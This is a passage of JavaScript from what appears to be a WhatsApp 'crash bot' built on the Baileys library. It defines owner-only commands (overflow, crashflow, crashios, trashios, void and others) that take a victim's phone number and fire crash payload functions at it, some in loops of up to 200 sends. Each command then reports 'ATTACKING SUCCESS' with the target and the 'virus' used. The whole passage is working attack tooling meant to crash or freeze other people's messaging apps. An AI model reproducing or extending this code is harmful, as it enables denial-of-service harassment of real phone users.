										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝗮𝗿𝗼𝘂𝘀𝗲𝗹 𝗦𝘁𝗶𝗰𝗸𝗲𝗿`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'tedex': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Tedex Number_\n_Example : Tedex 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Tedex Number_\n_Example : Tedex 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await ZnXIvS(X, Ptcp = true)
						await Tedex(X, dottm)
						await ZnXIvS(X, Ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝗮𝗿𝗼𝘂𝘀𝗲𝗹 𝗠𝗲𝘀𝘀𝗮𝗴𝗲`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'overflow': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : OverFlow Number_\n_Example : OverFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : OverFlow Number_\n_Example : OverFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await GlX(X, Ptcp = true)
						await StuckNull(X, GetsuZo, Ptcp = true)
					}
					for (let i = 0; i < 20; i++) {
						await TrashSystem(X, GetsuZo, Ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗢𝗩𝗘𝗥 𝗙𝗟𝗢𝗪`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"Flowinfinite ${incTarget}\"}`
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'flowinfinite': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Flowinfinite Number_\n_Example : Flowinfinite 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Flowinfinite Number_\n_Example : Flowinfinite 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 50; i++) {
						await TrashSystem(X, GetsuZo, Ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗙𝗟𝗢𝗪 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'crashflow': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : CrashFlow Number_\n_Example : CrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : CrashFlow Number_\n_Example : CrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await GlX(X, Ptcp = true)
						await StuckNull(X, GetsuZo, Ptcp = true)
					}
					for (let i = 0; i < 20; i++) {
						await TrashSystem(X, GetsuZo, Ptcp = true)
					}
					for (let i = 0; i < 1; i++) {
						await ClPm(X, GetsuZo, cct = true, ptcp = true)
						await InVisiXz(X, GetsuZo, cct = true, ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊⭑̤`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'suxo': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Suxo Number_\n_Example : Suxo 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Suxo Number_\n_Example : Suxo 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await ZnX(X, "P", 1020000, Ptcp = true)
						await ClPmNull(X, null, GetsuZo, cct = true, ptcp = true)
						await ClPmNull(X, null, GetsuZo, cct = true, ptcp = true)
						await ZnX(X, nick.sss, 350000, Ptcp = true)
						await ZnX(X, nick.sss, 800000, Ptcp = true)
						await ZnX(X, nick.sss, 800000, Ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗦𝗾𝗹 𝗫 𝗣𝗮𝘆`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"Suxoinfinity ${incTarget}\"}`
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'crashios': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Crashios Number_\n_Example : Crashios 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Crashios Number_\n_Example : Crashios 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 200; i++) {
						await IosCrash(X)
						await sleep(1500)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝗿𝗮𝘀𝗵 𝗜𝗼𝗦`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'trashios': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Trashios Number_\n_Example : Trashios 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Trashios Number_\n_Example : Trashios 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 200; i++) {
						await XiosPay(X)
						await XiosVirus(X)
						await sleep(500)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗧𝗿𝗮𝘀𝗵 𝗜𝗼𝗦`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'void': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Void Number_\n_Example : Void 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Void Number_\n_Example : Void 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await TxIos(X, Ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗩𝗼𝗶𝗱𝗙𝗹𝘂𝘅 𝗜𝗼𝗦`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"Infinitevoid ${incTarget}\"}`
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
